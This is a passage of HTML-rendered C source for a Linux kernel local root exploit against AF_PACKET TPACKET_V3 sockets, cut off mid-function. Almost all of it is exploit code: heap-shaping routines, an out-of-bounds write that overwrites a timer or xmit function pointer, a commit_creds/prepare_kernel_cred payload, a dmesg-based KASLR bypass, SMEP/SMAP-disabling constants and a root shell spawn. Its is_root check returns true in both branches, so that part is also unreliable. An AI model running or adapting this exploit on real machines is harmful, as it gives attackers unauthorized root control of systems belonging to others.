class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/klog.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/udp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ENABLE_KASLR_BYPASS	0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ENABLE_SMEP_SMAP_BYPASS	0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Will be overwritten if ENABLE_KASLR_BYPASS</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> KERNEL_BASE = 	<span class="number">0xffffffff81000000</span>ul;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Kernel symbol offsets</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS		0x8db30ul</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED	0x8df60ul</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NATIVE_WRITE_CR4	0x301f0ul</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Should have SMEP and SMAP bits disabled</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CR4_DESIRED_VALUE	0x407f0ul</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_PAD		512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGEALLOC_PAD		1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * Kernel structs * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> u32;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $ pahole -C hlist_node ./vmlinux</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> *        <span class="title">next</span>;</span>                 <span class="comment">/*     0     8 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> * *      <span class="title">pprev</span>;</span>                <span class="comment">/*     8     8 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $ pahole -C timer_list ./vmlinux</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>          <span class="title">entry</span>;</span>                <span class="comment">/*     0    16 */</span></span><br><span class="line">	<span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span>          expires;              <span class="comment">/*    16     8 */</span></span><br><span class="line">	<span class="type">void</span>                       (*function)(<span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span>); <span class="comment">/*    24     8 */</span></span><br><span class="line">	<span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span>          data;                 <span class="comment">/*    32     8 */</span></span><br><span class="line">	u32                        flags;                <span class="comment">/*    40     4 */</span></span><br><span class="line">	<span class="type">int</span>                        start_pid;            <span class="comment">/*    44     4 */</span></span><br><span class="line">	<span class="type">void</span> *                     start_site;           <span class="comment">/*    48     8 */</span></span><br><span class="line">	<span class="type">char</span>                       start_comm[<span class="number">16</span>];       <span class="comment">/*    56    16 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// packet_sock-&gt;rx_ring-&gt;prb_bdqc-&gt;retire_blk_timer</span></span><br><span class="line"><span class="comment">// #define TIMER_OFFSET	896</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TIMER_OFFSET	880</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pakcet_sock-&gt;xmit</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XMIT_OFFSET	1304</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * Helpers * * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_rx_ring_init</span><span class="params">(<span class="type">int</span> s, <span class="type">unsigned</span> <span class="type">int</span> block_size,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> frame_size, <span class="type">unsigned</span> <span class="type">int</span> block_nr,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">unsigned</span> <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">	<span class="type">int</span> v = TPACKET_V3;</span><br><span class="line">	<span class="type">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] setsockopt(PACKET_VERSION)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">	req.tp_block_size = block_size;</span><br><span class="line">	req.tp_frame_size = frame_size;</span><br><span class="line">	req.tp_block_nr = block_nr;</span><br><span class="line">	req.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">	req.tp_retire_blk_tov = timeout;</span><br><span class="line">	req.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">	req.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] setsockopt(PACKET_RX_RING)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_socket_setup</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> block_size, <span class="type">unsigned</span> <span class="type">int</span> frame_size,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> block_nr, <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">	<span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">	<span class="keyword">if</span> (s &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] socket(AF_PACKET)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,</span><br><span class="line">		sizeof_priv, timeout);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">	sa.sll_family = PF_PACKET;</span><br><span class="line">	sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">	sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">	sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">	sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">	sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> rv = bind(s, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] bind(AF_PACKET)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_send</span><span class="params">(<span class="type">int</span> s, <span class="type">char</span> *buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">	sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">	sa.sll_halen = ETH_ALEN;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sendto(s, buffer, size, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;sa,</span><br><span class="line">			<span class="keyword">sizeof</span>(sa)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] sendto(SOCK_RAW)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loopback_send</span><span class="params">(<span class="type">char</span> *buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">	<span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line">	<span class="keyword">if</span> (s == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] socket(SOCK_RAW)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	packet_socket_send(s, buffer, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_sock_kmalloc</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));</span><br><span class="line">	<span class="keyword">if</span> (s == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] socket(SOCK_DGRAM)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_sock_timer_schedule</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">	packet_socket_rx_ring_init(s, <span class="number">0x1000</span>, <span class="number">0x1000</span>, <span class="number">1</span>, <span class="number">0</span>, timeout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_sock_id_match_trigger</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">16</span>];</span><br><span class="line">	packet_socket_send(s, &amp;buffer[<span class="number">0</span>], <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGN(x, a)			__ALIGN_KERNEL((x), (a))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __ALIGN_KERNEL(x, a)		__ALIGN_KERNEL_MASK(x, (typeof(x))(a) - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __ALIGN_KERNEL_MASK(x, mask)	(((x) + (mask)) &amp; ~(mask))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> V3_ALIGNMENT	(8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLK_HDR_LEN	(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ETH_HDR_LEN	sizeof(struct ethhdr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IP_HDR_LEN	sizeof(struct iphdr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UDP_HDR_LEN	sizeof(struct udphdr)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UDP_HDR_LEN_FULL	(ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_SIZE 0x4000</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">oob_setup</span><span class="params">(<span class="type">int</span> offset)</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> maclen = ETH_HDR_LEN;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +</span><br><span class="line">				(maclen &lt; <span class="number">16</span> ? <span class="number">16</span> : maclen));</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> macoff = netoff - maclen;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> sizeof_priv = (<span class="number">1u</span>&lt;&lt;<span class="number">31</span>) + (<span class="number">1u</span>&lt;&lt;<span class="number">30</span>) +</span><br><span class="line">		SLAB_SIZE - BLK_HDR_LEN - macoff + offset;</span><br><span class="line">	<span class="keyword">return</span> packet_socket_setup(SLAB_SIZE, <span class="number">2048</span>, <span class="number">2</span>, sizeof_priv, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">oob_write</span><span class="params">(<span class="type">char</span> *buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">	loopback_send(buffer, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">oob_timer_execute</span><span class="params">(<span class="type">void</span> *func, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">	oob_setup(<span class="number">2048</span> + TIMER_OFFSET - <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;oob setup finished\\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">		<span class="type">int</span> timer = packet_sock_kmalloc();</span><br><span class="line">		packet_sock_timer_schedule(timer, <span class="number">1000</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">2048</span>];</span><br><span class="line">	<span class="built_in">memset</span>(&amp;buffer[<span class="number">0</span>], <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> *<span class="title">timer</span> =</span> (<span class="keyword">struct</span> timer_list *)&amp;buffer[<span class="number">8</span>];</span><br><span class="line">	timer-&gt;function = func;</span><br><span class="line">	timer-&gt;data = arg;</span><br><span class="line">	timer-&gt;flags = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	oob_write(&amp;buffer[<span class="number">0</span>] + <span class="number">2</span>, <span class="keyword">sizeof</span>(*timer) + <span class="number">8</span> - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">oob_id_match_execute</span><span class="params">(<span class="type">void</span> *func)</span> &#123;</span><br><span class="line">	<span class="type">int</span> s = oob_setup(<span class="number">2048</span> + XMIT_OFFSET - <span class="number">64</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> ps[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">		ps[i] = packet_sock_kmalloc();</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">2048</span>];</span><br><span class="line">	<span class="built_in">memset</span>(&amp;buffer[<span class="number">0</span>], <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> **xmit = (<span class="type">void</span> **)&amp;buffer[<span class="number">64</span>];</span><br><span class="line">	*xmit = func;</span><br><span class="line"></span><br><span class="line">	oob_write((<span class="type">char</span> *)&amp;buffer[<span class="number">0</span>] + <span class="number">2</span>, <span class="keyword">sizeof</span>(*xmit) + <span class="number">64</span> - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;oob write finished\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">		packet_sock_id_match_trigger(ps[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * Heap shaping * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kmalloc_pad</span><span class="params">(<span class="type">int</span> count)</span> &#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">		packet_sock_kmalloc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pagealloc_pad</span><span class="params">(<span class="type">int</span> count)</span> &#123;</span><br><span class="line">	packet_socket_setup(SLAB_SIZE, <span class="number">2048</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * Getting root * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="type">unsigned</span> <span class="type">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="type">unsigned</span> <span class="type">long</span> cred);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_payload</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">	((_commit_creds)(KERNEL_BASE + COMMIT_CREDS))(</span><br><span class="line">		((_prepare_kernel_cred)(KERNEL_BASE + PREPARE_KERNEL_CRED))(<span class="number">0</span>)</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * Simple KASLR bypass * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSLOG_ACTION_READ_ALL 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSLOG_ACTION_SIZE_BUFFER 10</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">get_kernel_addr</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (size == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	size = (size / getpagesize() + <span class="number">1</span>) * getpagesize();</span><br><span class="line">	<span class="type">char</span> *buffer = (<span class="type">char</span> *)mmap(<span class="literal">NULL</span>, size, PROT_READ|PROT_WRITE,</span><br><span class="line">		MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	size = klogctl(SYSLOG_ACTION_READ_ALL, &amp;buffer[<span class="number">0</span>], size);</span><br><span class="line">	<span class="keyword">if</span> (size == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] klogctl(SYSLOG_ACTION_READ_ALL)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *needle1 = <span class="string">&quot;Freeing SMP&quot;</span>;</span><br><span class="line">	<span class="type">char</span> *substr = (<span class="type">char</span> *)memmem(&amp;buffer[<span class="number">0</span>], size, needle1, <span class="built_in">strlen</span>(needle1));</span><br><span class="line">	<span class="keyword">if</span> (substr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[-] substring &#x27;%s&#x27; not found in dmesg\\n&quot;</span>, needle1);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (size = <span class="number">0</span>; substr[size] != <span class="string">&#x27;\\n&#x27;</span>; size++);</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *needle2 = <span class="string">&quot;ffff&quot;</span>;</span><br><span class="line">	substr = (<span class="type">char</span> *)memmem(&amp;substr[<span class="number">0</span>], size, needle2, <span class="built_in">strlen</span>(needle2));</span><br><span class="line">	<span class="keyword">if</span> (substr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[-] substring &#x27;%s&#x27; not found in dmesg\\n&quot;</span>, needle2);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> *endptr = &amp;substr[<span class="number">16</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r = strtoul(&amp;substr[<span class="number">0</span>], &amp;endptr, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">	r &amp;= <span class="number">0xfffffffffff00000</span>ul;</span><br><span class="line">	r -= <span class="number">0x1000000</span>ul;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exec_shell</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> *shell = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">	<span class="type">char</span> *args[] = &#123;shell, <span class="string">&quot;-i&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">	execve(shell, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fork_shell</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">pid_t</span> rv;</span><br><span class="line"></span><br><span class="line">	rv = fork();</span><br><span class="line">	<span class="keyword">if</span> (rv == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] fork()&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (rv == <span class="number">0</span>) &#123;</span><br><span class="line">		exec_shell();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_root</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">// We can&#x27;t simple check uid, since we&#x27;re running inside a namespace</span></span><br><span class="line">	<span class="comment">// with uid set to 0. Try opening /etc/shadow instead.</span></span><br><span class="line">	<span class="type">int</span> fd = open(<span class="string">&quot;/etc/shadow&quot;</span>, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	close(fd);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_root</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[.] checking if we got root\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!is_root()) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] something went wrong =(\\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] got r00t ^_^\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Fork and exec instead of just doing the exec to avoid potential</span></span><br><span class="line">	<span class="comment">// memory corruptions when closing packet sockets.</span></span><br><span class="line">	fork_shell();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">write_file</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* file, <span class="type">const</span> <span class="type">char</span>* what, ...)</span> &#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">	va_list args;</span><br><span class="line">	va_start(args, what);</span><br><span class="line">	vsnprintf(buf, <span class="keyword">sizeof</span>(buf), what, args);</span><br><span class="line">	va_end(args);</span><br><span class="line">	buf[<span class="keyword">sizeof</span>(buf) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">strlen</span>(buf);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> fd = open(file, O_WRONLY | O_CLOEXEC);</span><br><span class="line">	<span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span> (write(fd, buf, len) != len) &#123;</span><br><span class="line">		close(fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	close(fd);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup_sandbox</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> real_uid = getuid();</span><br><span class="line">	<span class="type">int</span> real_gid = getgid();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unshare(CLONE_NEWUSER) != <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unshare(CLONE_NEWNET) != <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">		<span 